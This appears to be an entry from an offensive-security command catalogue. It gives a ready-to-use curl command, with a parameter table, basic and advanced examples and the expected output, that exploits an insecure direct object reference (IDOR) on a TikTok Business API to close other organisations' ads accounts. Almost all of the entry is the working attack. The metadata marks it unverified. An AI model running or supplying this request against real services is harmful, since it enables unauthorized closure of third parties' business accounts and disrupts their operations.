---
id: cmd-curl-close-2
data: >-
  curl -X POST 'https://business.tiktok.com/api/ads/close' -H 'Authorization:
  Bearer TOKEN' -d
  'org_id=TARGET_ORG_ID&account_id=TARGET_ACCOUNT_ID&status=closed'
tags:
  - web
  - api
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.042Z'
verified: false
validated: true
submitted: true
---
# curl-close-account

## Command

```bash
curl -X POST 'https://business.tiktok.com/api/ads/close' -H 'Authorization: Bearer TOKEN' -d 'org_id=TARGET_ORG_ID&account_id=TARGET_ACCOUNT_ID&status=closed'
```

## Description

This command exploits IDOR by sending a POST request to close an unauthorized ads account on TikTok Business using manipulated parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for closing account | Yes |
| `org_id=TARGET_ORG_ID` | Target organization ID | Yes |
| `account_id=TARGET_ACCOUNT_ID` | Target account ID to close | Yes |
| `&status=closed` | Action parameter to set status | Yes |
| `-H 'Authorization: Bearer TOKEN'` | Session authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://business.tiktok.com/api/ads/close' -H 'Authorization: Bearer TOKEN' -d 'org_id=123&account_id=456&status=closed'
```

### Advanced Usage

```bash
curl -X POST 'https://business.tiktok.com/api/ads/close' -H 'Authorization: Bearer TOKEN' -d 'org_id=123&account_id=456&status=closed&reason=unauthorized'
```

## Expected Output

JSON response confirming account closure, e.g., {"status": "closed", "account_id": 456}.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-to-Close-Unauthorized-Ads-Account]]
